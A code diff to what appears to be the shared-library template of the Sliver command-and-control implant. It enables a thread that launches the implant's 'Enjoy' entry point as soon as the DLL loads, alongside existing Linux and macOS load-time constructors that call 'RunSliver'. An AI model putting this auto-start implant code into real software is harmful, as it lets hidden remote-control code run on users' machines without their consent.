@@ -18,11 +18,13 @@ BOOL WINAPI DllMain(
     case DLL_PROCESS_ATTACH:
         // Initialize once for each new process.
         // Return FALSE to fail DLL load.
-        {
-            // HANDLE hThread = CreateThread(NULL, 0, Enjoy, NULL, 0, NULL);
-            // CreateThread() because otherwise DllMain() is highly likely to deadlock.
-        }
-        break;
+    {
+        // {{if .IsSharedLib}}
+        HANDLE hThread = CreateThread(NULL, 0, Enjoy, NULL, 0, NULL);
+        // CreateThread() because otherwise DllMain() is highly likely to deadlock.
+        // {{end}}
+    }
+    break;
     case DLL_PROCESS_DETACH:
         // Perform any necessary cleanup.
         break;
@@ -48,6 +50,7 @@ static void init(int argc, char **argv, char **envp)
 }
 __attribute__((section(".init_array"), used)) static typeof(init) *init_p = init;
 #elif __APPLE__
+#include <stdlib.h>
 void RunSliver();
 
 __attribute__((constructor)) static void init(int argc, char **argv, char **envp)
